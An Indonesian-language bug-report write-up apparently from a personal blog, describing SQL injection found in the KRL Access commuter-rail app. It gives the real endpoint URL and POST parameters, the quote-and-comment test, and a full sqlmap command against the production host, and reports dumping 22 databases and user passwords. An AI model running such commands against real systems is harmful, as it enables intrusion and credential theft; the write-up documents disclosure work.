---
title: SQL Injection - Application KRL Access
date: 2020/9/29
description: Write Up
tag: Write Up
author: You
---

![ ](https://miro.medium.com/max/665/1*zkOfhG0Zp6x3FYaRs1S0hQ.png)

Halo semuanya,
Kali ini saya ingin membagikan write up sederhana yang sesuai judul yaa, ok jadi langsung aja yaa.
Apa sih itu Commuter Line Indonesia? selengkapnya ada di [Wikipedia](https://id.wikipedia.org/wiki/KRL_Commuter_Line)

Saya mencari vulnerability nya melalui Intercept di aplikasi KRL Access Mobile, saya intercept menggunakan Burpsuite yang sudah saya konfigurasi agar bisa melakukan intercept http request di aplikasi Android. lalu saya melakukan intercept di bagian schedule and route, seperti ini

![ ](https://miro.medium.com/max/2400/1*vSYZP8d86JDTkF_F8H230Q.jpeg)

Lalu saya mendapatkan request url dan post data nya, berikut data nya

![ ](https://miro.medium.com/max/2400/1*N0WmvrJLyHYetYC0iBAfRA.png)

> Request Url: http://info.krl.co.id//VQFXIQNcRQkEQkdHVh1aW1dfQDhGF0dFRxFRFB8WbVBKTRYIXUZPWUBYTARWTAlWVEBSCV9TSFoAUARUWgMGCTo1MDRjZDI3Mg==
Post data : no_ka=1465&id_stasiun=BKS

___

Selanjutnya saya mencoba untuk menginjeksi dengan single quote pada parameter no_ka, response nya adalah “500 internal server error”

![ ](https://miro.medium.com/max/2400/1*QI9cE4erO7YKDsY4ZBy_yw.png)

Lalu saya tambahkan ( — -) setelah single quote, maka menampilkan data data normal, berarti menandakan bahwa vulnerability terhadap SQL Injection. awalnya saya tidak yakin vulnerable SQL Injection, sebab respons nya 500 Internal Server Error, tetapi saya menambahkan balance menampilkan data normal.

![ ](https://miro.medium.com/max/2400/1*UA663wzxpLdy3raZfMxMYA.png)

___

Selanjutnya saya scan di SQLMAP dengan command

```
sqlmap -u "http://info.krl.co.id//VQFXIQNcRQkEQkdHVh1aW1dfQDhGF0dFRxFRFB8WbVBKTRYIXUZPWUBYTARWTAlWVEBSCV9TSFoAUARUWgMGCTo1MDRjZDI3Mg==" --data="no_ka=1465&id_stasiun=BKS" --level 3 --risk 3 --dbs
```

Maka hasil scannya adalah saya mendapatkan 22 database

![ ](https://miro.medium.com/max/2400/1*sf0XDAPeMlw_LXbDpnjS4Q.png)

Dan 5 Users

![ ](https://miro.medium.com/max/2400/1*rhfD2OEMFsrUyq-pecfh-w.png)

Beserta Passwordnya

![ ](https://miro.medium.com/max/2400/1*dhPyZ0hre8jHl2G8vZ2XwQ.jpeg)

___

## Timeline Report

- 4 Agustus, 2020 send report to email commuter.care@krl.co.id

Jangan lupa di share yaa, agar saya bisa untuk memberikan write up sederhana lagi. see you!

Contact me at [About Me](/about)